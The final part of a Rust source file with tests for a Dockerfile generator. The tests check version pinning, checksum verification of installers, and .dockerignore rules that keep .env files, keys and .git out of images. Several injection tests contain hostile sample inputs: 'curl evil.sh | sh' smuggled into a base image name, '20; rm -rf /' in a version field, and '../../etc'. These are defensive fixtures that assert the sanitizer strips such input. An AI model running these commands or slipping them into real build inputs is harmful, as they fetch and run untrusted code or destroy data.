        volumes: vec![(project_dir.display().to_string(), "/app".to_string())],
        workdir: Some("/app".to_string()),
        rm: true,
        interactive: true,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;

    #[test]
    fn dev_container_config_sanitizes_project_directory_name() {
        let config = dev_container_config(Path::new("/workspace/My Project!"));

        assert_eq!(config.name.as_deref(), Some("My-Project-dev"));
    }

    #[test]
    fn test_container_config_default() {
        let config = ContainerConfig::default();
        assert_eq!(config.image, "ubuntu:24.04");
        assert!(config.rm);
        assert!(config.interactive);
    }

    #[test]
    fn test_generate_dockerfile() {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);
        let dockerfile = manager
            .generate_dockerfile(
                "ubuntu:24.04",
                &[("node", "20.10.0")],
                &InstallerDigests::new(),
            )
            .content;
        assert!(dockerfile.contains("FROM ubuntu:24.04"));
        // Check for Node.js installation (new format installs runtimes)
        assert!(dockerfile.contains("Install Node.js") || dockerfile.contains("NODE_VERSION"));
    }

    #[test]
    fn python_distro_install_does_not_claim_the_requested_version_is_installed() {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);
        let generated = manager.generate_dockerfile(
            "ubuntu:24.04",
            &[("python", "3.13.2")],
            &InstallerDigests::new(),
        );

        assert!(
            !generated.content.contains("ENV PYTHON_VERSION="),
            "{}",
            generated.content
        );
        assert!(
            generated.content.contains("distribution default"),
            "{}",
            generated.content
        );
    }

    #[cfg(unix)]
    #[test]
    fn generated_python_version_check_rejects_a_different_distro_interpreter() -> Result<()> {
        use std::os::unix::fs::PermissionsExt;
        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);
        let generated = manager.generate_dockerfile(
            "ubuntu:24.04",
            &[("python", "3.13.2")],
            &InstallerDigests::new(),
        );
        let check = generated
            .content
            .lines()
            .find_map(|line| {
                line.strip_prefix("RUN ")
                    .filter(|command| command.contains("OMG runtime version mismatch"))
            })
            .expect("generated Python installation must verify its request");
        let directory = tempfile::tempdir()?;
        let python = directory.path().join("python3");
        fs::write(&python, "#!/bin/sh\nprintf '3.12.9\\n'\n")?;
        fs::set_permissions(&python, fs::Permissions::from_mode(0o755))?;
        let output = std::process::Command::new("sh")
            .args(["-c", check])
            .env(
                "PATH",
                format!("{}:/usr/bin:/bin", directory.path().display()),
            )
            .output()?;

        assert!(!output.status.success(), "wrong Python provider must fail");
        assert!(String::from_utf8_lossy(&output.stderr).contains("OMG runtime version mismatch"));
        Ok(())
    }

    #[cfg(unix)]
    #[test]
    fn generated_python_version_check_accepts_matching_exact_and_partial_pins() -> Result<()> {
        use std::os::unix::fs::PermissionsExt;
        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);
        let directory = tempfile::tempdir()?;
        let python = directory.path().join("python3");
        fs::write(&python, "#!/bin/sh\nprintf '3.13.2\\n'\n")?;
        fs::set_permissions(&python, fs::Permissions::from_mode(0o755))?;
        for version in ["3.13.2", "3.13", "3"] {
            let generated = manager.generate_dockerfile(
                "ubuntu:24.04",
                &[("python", version)],
                &InstallerDigests::new(),
            );
            let check = generated
                .content
                .lines()
                .find_map(|line| {
                    line.strip_prefix("RUN ")
                        .filter(|command| command.contains("OMG runtime version mismatch"))
                })
                .expect("generated installation must verify its request");
            let output = std::process::Command::new("sh")
                .args(["-c", check])
                .env(
                    "PATH",
                    format!("{}:/usr/bin:/bin", directory.path().display()),
                )
                .output()?;
            assert!(
                output.status.success(),
                "matching Python {version} must pass: {}",
                String::from_utf8_lossy(&output.stderr)
            );
        }
        Ok(())
    }

    #[test]
    fn unsupported_runtime_constraints_make_direct_generated_builds_fail_closed() {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);
        let generated = manager.generate_dockerfile(
            "ubuntu:24.04",
            &[("python", ">=3.13")],
            &InstallerDigests::new(),
        );
        assert!(!generated.runtime_errors.is_empty());
        assert!(
            generated
                .content
                .contains("OMG cannot satisfy runtime version request for python")
        );
        assert!(!generated.content.contains("ENV PYTHON_VERSION="));
    }

    #[test]
    fn container_request_node_prefix_selects_the_requested_provider() {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);
        let generated = manager.generate_dockerfile(
            "ubuntu:24.04",
            &[("node", "v22.13.1")],
            &InstallerDigests::new(),
        );
        assert!(generated.runtime_errors.is_empty());
        assert!(
            generated
                .content
                .contains("https://deb.nodesource.com/setup_22.x")
        );
        assert!(!generated.content.contains("setup_20.x"));
    }

    #[test]
    fn container_review_unspecified_node_uses_a_nonempty_provider() {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);
        let generated =
            manager.generate_dockerfile("ubuntu:24.04", &[("node", "")], &InstallerDigests::new());
        assert!(generated.runtime_errors.is_empty());
        assert!(generated.content.contains("setup_20.x"));
        assert!(!generated.content.contains("setup_.x"));
    }

    #[cfg(unix)]
    #[test]
    fn container_review_version_guards_preserve_provider_failure() -> Result<()> {
        use std::os::unix::fs::PermissionsExt;
        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);
        let directory = tempfile::tempdir()?;
        for (runtime, version, output_text) in [
            ("go", "1.23.5", "go version go1.23.5 linux/amd64"),
            ("java", "21.0.5", "openjdk version \"21.0.5\""),
        ] {
            let executable = directory.path().join(runtime);
            let generated = manager.generate_dockerfile(
                "ubuntu:24.04",
                &[(runtime, version)],
                &InstallerDigests::new(),
            );
            assert!(generated.runtime_errors.is_empty());
            let check = generated
                .content
                .lines()
                .find_map(|line| {
                    line.strip_prefix("RUN ")
                        .filter(|command| command.contains("OMG runtime version mismatch"))
                })
                .expect("runtime request must have a version guard");
            for provider_status in [17, 0] {
                fs::write(
                    &executable,
                    format!("#!/bin/sh\nprintf '%s\\n' '{output_text}'\nexit {provider_status}\n"),
                )?;
                fs::set_permissions(&executable, fs::Permissions::from_mode(0o755))?;
                let output = std::process::Command::new("sh")
                    .args(["-c", check])
                    .env(
                        "PATH",
                        format!("{}:/usr/bin:/bin", directory.path().display()),
                    )
                    .output()?;
                assert_eq!(
                    output.status.success(),
                    provider_status == 0,
                    "{runtime} provider status {provider_status}"
                );
            }
        }
        Ok(())
    }

    #[cfg(unix)]
    #[test]
    fn container_review_go_archive_refuses_a_foreign_platform() -> Result<()> {
        use std::os::unix::fs::PermissionsExt;
        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);
        let generated = manager.generate_dockerfile(
            "arm64v8/ubuntu:24.04",
            &[("go", "")],
            &InstallerDigests::new(),
        );
        let guard = generated
            .content
            .find("dpkg --print-architecture")
            .expect("hardcoded amd64 archive must guard target architecture");
        let archive = generated
            .content
            .find("curl -fsSL -o /tmp/omg-go.tar.gz")
            .expect("archive install");
        assert!(guard < archive);
        assert!(generated.content.contains("amd64"));
        let check = generated
            .content
            .lines()
            .find_map(|line| {
                line.strip_prefix("RUN ")
                    .filter(|command| command.contains("dpkg --print-architecture"))
            })
            .expect("platform guard");
        let directory = tempfile::tempdir()?;
        let dpkg = directory.path().join("dpkg");
        for (architecture, provider_status) in [("arm64", 0), ("amd64", 0), ("amd64", 17)] {
            fs::write(
                &dpkg,
                format!("#!/bin/sh\nprintf '%s\\n' '{architecture}'\nexit {provider_status}\n"),
            )?;
            fs::set_permissions(&dpkg, fs::Permissions::from_mode(0o755))?;
            let output = std::process::Command::new("sh")
                .args(["-c", check])
                .env(
                    "PATH",
                    format!("{}:/usr/bin:/bin", directory.path().display()),
                )
                .output()?;
            assert_eq!(
                output.status.success(),
                architecture == "amd64" && provider_status == 0,
                "{architecture}"
            );
        }
        Ok(())
    }

    #[test]
    fn container_request_go_prefix_selects_a_valid_release_url() {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);
        let generated = manager.generate_dockerfile(
            "ubuntu:24.04",
            &[("go", "v1.23.5")],
            &InstallerDigests::new(),
        );
        assert!(generated.runtime_errors.is_empty());
        assert!(
            generated
                .content
                .contains("https://go.dev/dl/go1.23.5.linux-amd64.tar.gz")
        );
        assert!(!generated.content.contains("gov1.23.5"));
    }

    #[test]
    fn container_request_java_system_uses_the_debian_jdk_provider() {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);
        let generated = manager.generate_dockerfile(
            "ubuntu:24.04",
            &[("java", "system")],
            &InstallerDigests::new(),
        );
        assert!(generated.runtime_errors.is_empty());
        assert!(generated.content.contains("apt-get install -y default-jdk"));
    }

    #[test]
    fn container_request_rust_system_refuses_an_unsupported_provider() {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);
        let generated = manager.generate_dockerfile(
            "ubuntu:24.04",
            &[("rust", "system")],
            &InstallerDigests::new(),
        );
        assert!(!generated.runtime_errors.is_empty());
        assert!(!generated.content.contains("--default-toolchain system"));
    }

    #[test]
    fn unresolved_runtime_aliases_are_refused_before_installer_generation() {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);
        for (runtime, version) in [
            ("node", "lts"),
            ("go", "latest"),
            ("bun", "latest"),
            ("rust", "default"),
            ("go", "default"),
        ] {
            let generated = manager.generate_dockerfile(
                "ubuntu:24.04",
                &[(runtime, version)],
                &InstallerDigests::new(),
            );
            assert!(!generated.runtime_errors.is_empty(), "{runtime} {version}");
            assert!(generated.unpinned_urls.is_empty(), "{runtime} {version}");
            assert!(
                generated
                    .content
                    .contains("OMG cannot satisfy runtime version request")
            );
        }
    }

    #[cfg(unix)]
    #[test]
    fn failed_container_command_is_not_reported_as_an_empty_result() {
        let output = std::process::Command::new("sh")
            .args(["-c", "printf 'daemon unavailable' >&2; exit 17"])
            .output()
            .expect("run failure fixture");

        let error = require_successful_output(output, "Container listing")
            .expect_err("non-zero container command must fail");

        assert!(error.to_string().contains("status Some(17)"));
        assert!(error.to_string().contains("daemon unavailable"));
    }

    #[test]
    fn non_debian_runtime_installs_use_the_base_image_package_manager() {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);
        let generated = manager.generate_dockerfile(
            "archlinux:latest",
            &[
                ("node", "22"),
                ("python", "3.12"),
                ("java", "21"),
                ("ruby", "3.3"),
            ],
            &InstallerDigests::new(),
        );
        assert!(generated.runtime_errors.is_empty(), "{generated:?}");
        let dockerfile = generated.content;

        assert!(!dockerfile.contains("apt-get"), "{dockerfile}");
        for package in ["nodejs", "python", "jdk-openjdk", "ruby"] {
            assert!(
                dockerfile.contains(&format!("pacman -S --noconfirm {package}")),
                "missing {package}: {dockerfile}"
            );
        }
    }

    #[test]
    fn test_generate_dockerfile_generic() {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);
        // Test generic package installation (e.g. gcc)
        let dockerfile = manager
            .generate_dockerfile(
                "ubuntu:24.04",
                &[("gcc", "latest")],
                &InstallerDigests::new(),
            )
            .content;
        assert!(dockerfile.contains("apt-get install -y gcc"));

        let dockerfile_arch = manager
            .generate_dockerfile(
                "archlinux:latest",
                &[("vim", "latest")],
                &InstallerDigests::new(),
            )
            .content;
        assert!(dockerfile_arch.contains("pacman -S --noconfirm vim"));
    }

    #[test]
    fn unsafe_base_image_normalizes_to_the_reported_fallback() {
        assert_eq!(
            normalized_base_image("ubuntu:24.04\nRUN evil"),
            "ubuntu:24.04"
        );
        assert_eq!(normalized_base_image("alpine:3.21"), "alpine:3.21");
    }

    #[test]
    fn generate_dockerfile_never_emits_injected_base_image() {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);
        for evil in [
            "ubuntu:24.04 && RUN curl evil.sh | sh",
            "ubuntu\nRUN malicious",
            "$HOME",
            "-flag",
            "../../etc",
            "",
        ] {
            let dockerfile = manager
                .generate_dockerfile(evil, &[], &InstallerDigests::new())
                .content;
            assert!(
                dockerfile.starts_with("FROM ubuntu:24.04\n"),
                "base image {evil:?}"
            );
            assert!(!dockerfile.contains("evil"), "base image {evil:?}");
            assert!(!dockerfile.contains("malicious"), "base image {evil:?}");
        }
    }

    #[test]
    fn generate_dockerfile_never_emits_injected_versions_or_runtime_names() {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);

        let dockerfile = manager
            .generate_dockerfile(
                "ubuntu:24.04",
                &[("node", "20; rm -rf /")],
                &InstallerDigests::new(),
            )
            .content;
        // Note: the legitimate cleanup line `rm -rf /var/lib/apt/lists/*`
        // exists in every Debian/Ubuntu Dockerfile, so assert on the
        // injected payload fragments instead.
        assert!(
            !dockerfile.contains("20;"),
            "version injection must be replaced"
        );
        assert!(
            !dockerfile.contains("NODE_VERSION=latest;"),
            "injected version must never survive"
        );

        let dockerfile = manager
            .generate_dockerfile(
                "ubuntu:24.04",
                &[("pkg; curl evil", "1.0")],
                &InstallerDigests::new(),
            )
            .content;
        assert!(
            !dockerfile.contains("curl evil") && !dockerfile.contains("install -y pkg;"),
            "runtime-name injection must be skipped entirely"
        );
    }

    #[test]
    fn generate_dockerfile_accepts_valid_inputs_unchanged() {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);
        let dockerfile = manager
            .generate_dockerfile(
                "debian:bookworm-slim",
                &[("node", "20.10.0"), ("go", "1.22.5")],
                &InstallerDigests::new(),
            )
            .content;
        assert!(dockerfile.contains("FROM debian:bookworm-slim\n"));
        assert!(dockerfile.contains("NODE_VERSION=20"));
        assert!(dockerfile.contains("GO_VERSION=1.22.5"));
        assert!(!dockerfile.contains("curl -fsSL https://deb.nodesource.com"));
    }

    #[test]
    fn default_go_release_uses_a_patch_version_and_verifies_its_digest() {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);
        let url = "https://go.dev/dl/go1.22.0.linux-amd64.tar.gz";
        let digests = InstallerDigests::from([(url.to_string(), "a".repeat(64))]);
        for version in ["", "1.22.0"] {
            let generated =
                manager.generate_dockerfile("ubuntu:24.04", &[("go", version)], &digests);
            assert!(generated.runtime_errors.is_empty(), "{generated:?}");
            assert!(generated.unpinned_urls.is_empty());
            assert!(generated.content.contains(url));
            assert!(generated.content.contains("ENV GO_VERSION=1.22.0\n"));
            assert!(generated.content.contains("sha256sum -c -"));
        }
    }

    #[test]
    fn debian_runtime_packages_normalize_dotted_versions() {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);
        let dockerfile = manager
            .generate_dockerfile(
                "ubuntu:24.04",
                &[("java", "17.0.12"), ("ruby", "3.1.2")],
                &InstallerDigests::new(),
            )
            .content;

        assert!(dockerfile.contains("apt-get install -y openjdk-17-jdk"));
        assert!(dockerfile.contains("apt-get install -y ruby3.1"));
        assert!(!dockerfile.contains("openjdk-17.0.12"));
        assert!(!dockerfile.contains("ruby3.1.2"));
    }

    /// Remote installer content executed as root during the build must be
    /// verified against a pinned digest instead of piped into a shell.
    #[test]
    fn pinned_installers_are_checksum_verified_before_execution() {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);
        let digest = "a".repeat(64);
        let mut digests = InstallerDigests::new();
        for url in [
            "https://sh.rustup.rs",
            "https://bun.sh/install",
            "https://deb.nodesource.com/setup_20.x",
            "https://go.dev/dl/go1.22.5.linux-amd64.tar.gz",
        ] {
            digests.insert(url.to_string(), digest.clone());
        }
        let generated = manager.generate_dockerfile(
            "ubuntu:24.04",
            &[
                ("rust", "stable"),
                ("bun", "1.2.0"),
                ("node", "20.10.0"),
                ("go", "1.22.5"),
            ],
            &digests,
        );

        assert!(generated.runtime_errors.is_empty(), "{generated:?}");

        assert!(
            generated.unpinned_urls.is_empty(),
            "{:?}",
            generated.unpinned_urls
        );
        // No remote content is piped into an interpreter any more.
        assert!(
            !generated.content.contains("| sh -s"),
            "{:?}",
            generated.content
        );
        assert!(
            !generated.content.contains("| bash"),
            "{:?}",
            generated.content
        );
        assert!(
            !generated.content.contains("| tar"),
            "{:?}",
            generated.content
        );
        // Every installer verifies before executing.
        assert_eq!(generated.content.matches("sha256sum -c -").count(), 4);
    }

    #[test]
    fn unpinned_installers_are_flagged_for_fail_closed_regeneration() {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);
        let generated = manager.generate_dockerfile(
            "ubuntu:24.04",
            &[("rust", "stable")],
            &InstallerDigests::new(),
        );
        assert_eq!(
            generated.unpinned_urls,
            vec!["https://sh.rustup.rs".to_string()]
        );
        assert!(generated.content.contains("WARNING"), "{generated:?}");
    }

    /// Generated dev containers must not embed untracked credentials or the
    /// repository history via `COPY . .`.
    #[test]
    fn dockerignore_excludes_credentials_and_repository_data() {
        let dir = tempfile::tempdir().expect("temp project");
        ensure_dockerignore(dir.path()).expect("dockerignore created");
        let content = fs::read_to_string(dir.path().join(".dockerignore")).expect("read");
        for entry in [".git", ".env", ".env.*", "*.key", ".omg/"] {
            assert!(
                content.lines().any(|line| line.trim() == entry),
                "{content}"
            );
        }

        // Idempotent: a second pass must not duplicate entries.
        ensure_dockerignore(dir.path()).expect("second pass");
        let second = fs::read_to_string(dir.path().join(".dockerignore")).expect("read");
        assert_eq!(
            second.lines().filter(|line| line.trim() == ".git").count(),
            1,
            "{second}"
        );
    }

    #[test]
    fn dockerignore_protection_follows_user_negations() {
        let dir = tempfile::tempdir().expect("temp project");
        let path = dir.path().join(".dockerignore");
        fs::write(&path, ".env\n!.env\n!secrets.key\n").expect("user rules");
        ensure_dockerignore(dir.path()).expect("protect context");
        let content = fs::read_to_string(&path).expect("read rules");
        assert!(content.rfind("\n.env\n") > content.find("!.env"));
        assert!(content.rfind("*.key") > content.find("!secrets.key"));
        ensure_dockerignore(dir.path()).expect("idempotent");
        assert_eq!(content, fs::read_to_string(path).expect("read rules"));
    }

    #[test]
    fn dockerfile_specific_ignore_receives_the_same_protection() {
        let dir = tempfile::tempdir().expect("temp project");
        let path = dir.path().join("Dockerfile.omg.dockerignore");
        fs::write(&path, "!.env\n!secrets.key\n").expect("override");
        ensure_dockerignore(dir.path()).expect("protect context");
        let content = fs::read_to_string(path).expect("read override");
        assert!(content.rfind("\n.env\n") > content.find("!.env"));
        assert!(content.rfind("*.key") > content.find("!secrets.key"));
    }

    #[test]
    fn podman_ignore_receives_the_same_protection() {
        let dir = tempfile::tempdir().expect("temp project");
        let path = dir.path().join(".containerignore");
        fs::write(&path, "!.env\n").expect("override");
        ensure_dockerignore(dir.path()).expect("protect context");
        let content = fs::read_to_string(path).expect("read override");
        assert!(content.rfind("\n.env\n") > content.find("!.env"));
    }

    #[cfg(unix)]
    #[test]
    fn dockerignore_rejects_symlink_without_changing_target() {
        let dir = tempfile::tempdir().expect("temp project");
        let target = dir.path().join("external");
        fs::write(&target, "preserve me").expect("target");
        std::os::unix::fs::symlink(&target, dir.path().join(".dockerignore")).expect("symlink");
        assert!(ensure_dockerignore(dir.path()).is_err());
        assert_eq!(fs::read_to_string(target).expect("target"), "preserve me");
    }

    #[test]
    fn existing_dockerignore_is_preserved_and_extended() {
        let dir = tempfile::tempdir().expect("temp project");
        fs::write(dir.path().join(".dockerignore"), "target/\n").expect("user file");
        ensure_dockerignore(dir.path()).expect("merge");
        let content = fs::read_to_string(dir.path().join(".dockerignore")).expect("read");
        assert!(content.starts_with("target/\n"), "{content}");
        assert!(content.contains(".git"), "{content}");
    }
}
